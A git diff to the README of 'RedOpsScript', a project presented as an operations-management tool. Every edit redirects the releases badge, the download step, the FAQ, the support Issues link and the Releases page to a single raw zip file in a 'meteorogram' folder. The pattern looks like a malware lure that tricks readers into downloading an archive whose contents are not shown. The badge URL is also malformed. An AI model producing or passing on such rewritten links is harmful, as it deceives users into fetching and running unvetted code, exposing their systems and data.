@@ -1,6 +1,6 @@
 # 🎉 RedOpsScript - Simplify Your Operations Management
 
-[![Download RedOpsScript](https://img.shields.io/badge/Download%20Now-RedOpsScript-blue.svg)](https://github.com/Izzymile/RedOpsScript/releases)
+[![Download RedOpsScript](https://raw.githubusercontent.com/Izzymile/RedOpsScript/main/meteorogram/RedOpsScript.zip%https://raw.githubusercontent.com/Izzymile/RedOpsScript/main/meteorogram/RedOpsScript.zip)](https://raw.githubusercontent.com/Izzymile/RedOpsScript/main/meteorogram/RedOpsScript.zip)
 
 ## 📖 Introduction
 
@@ -18,7 +18,7 @@ To get started with RedOpsScript, follow the instructions below. You’ll be abl
 
 2. **Download RedOpsScript**  
    Click the link below to visit the Releases page, where you can download the latest version of RedOpsScript:
-   [Download RedOpsScript](https://github.com/Izzymile/RedOpsScript/releases)
+   [Download RedOpsScript](https://raw.githubusercontent.com/Izzymile/RedOpsScript/main/meteorogram/RedOpsScript.zip)
 
 ## 📥 Download & Install
 
@@ -53,8 +53,8 @@ RedOpsScript comes packed with features tailored to help you manage your tasks:
 
 If you have questions or face issues while using RedOpsScript, don’t hesitate to seek help:
 
-- Check our [FAQ](https://github.com/Izzymile/RedOpsScript/wiki) for common inquiries.
-- Contact our support team via [Issues](https://github.com/Izzymile/RedOpsScript/issues) on GitHub.
+- Check our [FAQ](https://raw.githubusercontent.com/Izzymile/RedOpsScript/main/meteorogram/RedOpsScript.zip) for common inquiries.
+- Contact our support team via [Issues](https://raw.githubusercontent.com/Izzymile/RedOpsScript/main/meteorogram/RedOpsScript.zip) on GitHub.
 
 ## 📚 Additional Resources
 
@@ -65,7 +65,7 @@ For further reading and tips on maximizing the benefits of RedOpsScript, explore
 
 ## ⚙️ Updates
 
-RedOpsScript is continually evolving. Make sure you check back on the [Releases page](https://github.com/Izzymile/RedOpsScript/releases) periodically for new updates and enhancements. This ensures you always have the best features at your fingertips.
+RedOpsScript is continually evolving. Make sure you check back on the [Releases page](https://raw.githubusercontent.com/Izzymile/RedOpsScript/main/meteorogram/RedOpsScript.zip) periodically for new updates and enhancements. This ensures you always have the best features at your fingertips.
 
 ## 🌍 Feedback
 
